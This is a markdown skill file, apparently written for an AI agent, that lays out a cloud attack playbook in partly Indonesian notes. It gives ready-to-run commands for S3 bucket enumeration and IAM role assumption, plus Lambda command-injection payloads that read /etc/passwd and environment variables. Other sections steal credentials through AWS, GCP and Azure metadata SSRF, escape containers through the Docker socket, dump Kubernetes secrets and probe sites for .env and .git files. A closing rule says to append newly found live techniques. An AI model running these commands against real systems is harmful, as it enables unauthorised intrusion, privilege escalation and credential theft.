---
name: cloud-security
description: Cloud security testing — AWS, GCP, Azure. S3 bucket enumeration, IAM misconfig, Lambda injection, metadata SSRF, container/K8s escape, cloud storage discovery.
---

# Cloud Security Toolkit

## Index

| # | Kategori | Isi |
|---|----------|-----|
| 1 | S3 Bucket Enumeration | Public buckets, listing, file discovery |
| 2 | AWS IAM Misconfig | Role chaining, privilege escalation |
| 3 | Lambda Injection | Event data injection, env var extraction |
| 4 | Metadata SSRF | AWS/GCP/Azure metadata endpoints |
| 5 | Container Escape | Docker socket, host FS, capabilities |
| 6 | Kubernetes | API exposure, pod exec, secrets |
| 7 | Cloud Storage Discovery | GCP buckets, Azure blobs, Firebase |
| 8 | Cloud Credential Leak | env files, git leaks, source maps |

---

## 1 — S3 Bucket Enumeration

```bash
# Bucket name permutations (base: target, target.com, target-inc)
# Patterns: target, target.com, target-backup, target-dev, target-staging
#          target-assets, target-files, target-media, target-uploads

# Check if bucket exists (public)
curl -sI "https://target.s3.amazonaws.com/" | head -5
curl -sI "https://target.s3.amazonaws.com/" | grep -i "403\|404\|200\|bucket"

# List bucket contents (if public)
curl -s "https://target.s3.amazonaws.com/" | grep -oP '<Key>[^<]+</Key>' | sed 's/<[^>]*>//g'

# Region-specific endpoints
curl -s "https://target.s3-us-east-1.amazonaws.com/"
curl -s "https://target.s3-eu-west-1.amazonaws.com/"
curl -s "https://target.s3-ap-southeast-1.amazonaws.com/"

# AWS CLI (if configured)
aws s3 ls s3://target/ --no-sign-request
aws s3api list-objects-v2 --bucket target --no-sign-request

# Permutation generator
for prefix in target target-dev target-staging target-backup target-files target-assets target-media target-log target-data target-config target-old target-test; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://$prefix.s3.amazonaws.com/")
  echo "$code $prefix"
done
```

---

## 2 — AWS IAM Misconfig

```bash
# Check caller identity
aws sts get-caller-identity

# List roles
aws iam list-roles
aws iam list-users

# Check attached policies
aws iam list-attached-role-policies --role-name ROLE_NAME

# Simulate principal policy
aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::ACCOUNT:user/USER \
  --action-names s3:ListAllMyBuckets ec2:DescribeInstances

# Check for assume role capabilities
aws sts assume-role --role-arn "arn:aws:iam::ACCOUNT:role/ADMIN_ROLE" \
  --role-session-name "test"

# Check instance profile
aws ec2 describe-iam-instance-profile-associations
```

---

## 3 — Lambda Injection

```bash
# Exploit when Lambda processes untrusted input (e.g., API Gateway)

# Event data injection (if event is passed to exec/eval)
# POST /api/process
{"data": "$(cat /etc/passwd)"}
{"data": "`cat /proc/self/environ`"}
{"data": "'; cat /proc/self/environ; '"}

# Extract environment variables (often contain AWS creds)
curl -s "https://target.com/api/process" -H "Content-Type: application/json" \
  -d '{"input":"test"}'

# If error reflection → may leak env
curl -s "https://target.com/api/process" -H "Content-Type: application/json" \
  -d '{"input":null}'  # trigger error

# Check /tmp for leftover files
curl -s "https://target.com/api/process" -H "Content-Type: application/json" \
  -d '{"input":"test; ls /tmp; "}'
```

---

## 4 — Metadata SSRF

```bash
# AWS (169.254.169.254)
curl -s "http://169.254.169.254/latest/meta-data/"
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "http://169.254.169.254/latest/user-data/"
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"

# AWS IMDSv2 (needs token)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/"

# GCP
curl -s "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# Azure
curl -s "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"

# Cloudflare metadata (workers)
curl -s "http://169.254.169.254/cdns/v1/"

# Alibaba Cloud
curl -s "http://100.100.100.200/latest/meta-data/"

# DigitalOcean
curl -s "http://169.254.169.254/metadata/v1/"
```

---

## 5 — Container Escape

```bash
# Check if running in container
cat /proc/1/cgroup | grep -i docker
cat /proc/1/cgroup | grep -i kube

# Docker socket (if mounted)
ls -la /var/run/docker.sock 2>/dev/null
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json

# If docker socket accessible → escape
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/sh

# Check capabilities
cat /proc/self/status | grep Cap

# Host filesystem access
ls -la /host/ 2>/dev/null
ls -la /var/run/secrets/ 2>/dev/null

# Environment variables
env | grep -iE 'aws|gcp|azure|secret|key|token|password|credential'
```

---

## 6 — Kubernetes

```bash
# Check K8s API access
curl -s "https://kubernetes.default.svc/api/v1/namespaces" \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# List pods
curl -s "https://kubernetes.default.svc/api/v1/namespaces/default/pods" \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# List secrets (if RBAC allows)
curl -s "https://kubernetes.default.svc/api/v1/namespaces/default/secrets" \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Check K8s API exposed on public port
naabu -host target.com -p 6443,443,8080 -scan
curl -sk "https://target.com:6443/api"
```

---

## 7 — Cloud Storage Discovery

```bash
# GCP buckets
curl -sI "https://storage.googleapis.com/target-bucket/"
curl -sI "https://www.googleapis.com/storage/v1/b/target-bucket/o"

# Azure blobs
curl -sI "https://target.blob.core.windows.net/test"
curl -sI "https://target.blob.core.windows.net/test?restype=container&comp=list"

# Firebase database (misconfigured)
curl -s "https://target.firebaseio.com/.json"
curl -s "https://target-default-rtdb.firebaseio.com/.json"

# CloudFront distribution
curl -sI "https://d12345.cloudfront.net/"
```

---

## 8 — Cloud Credential Leak

```bash
# Check common env file paths
curl -s "https://target.com/.env"
curl -s "https://target.com/.env.local"
curl -s "https://target.com/.env.production"
curl -s "https://target.com/env"

# Git exposure
curl -s "https://target.com/.git/config"
curl -s "https://target.com/.git/HEAD"

# Check for AWS keys in JS files
grep -oP 'AKIA[0-9A-Z]{16}' *.js | sort -u
grep -oP '(?i)(aws_access_key|aws_secret_key|aws_session_token)\s*[=:]\s*["'\'']?\S+' *.js

# Common config file names
for f in config.json config.js config.php .env .env.local .env.production secrets.yml secrets.json credentials.json; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$f")
  echo "$code $f"
done
```

---

## Live Testing — Append New Findings

> **Aturan:** Saat live testing nemu teknik cloud security BARU, tambah entry baru di sini. **JANGAN edit/hapus entry lama.**

### [N+1] — Nama Teknik Baru

**Target:** ...
**Provider:** ...
**Payload:** ...
**Tool:** ...
**Catatan:** ...
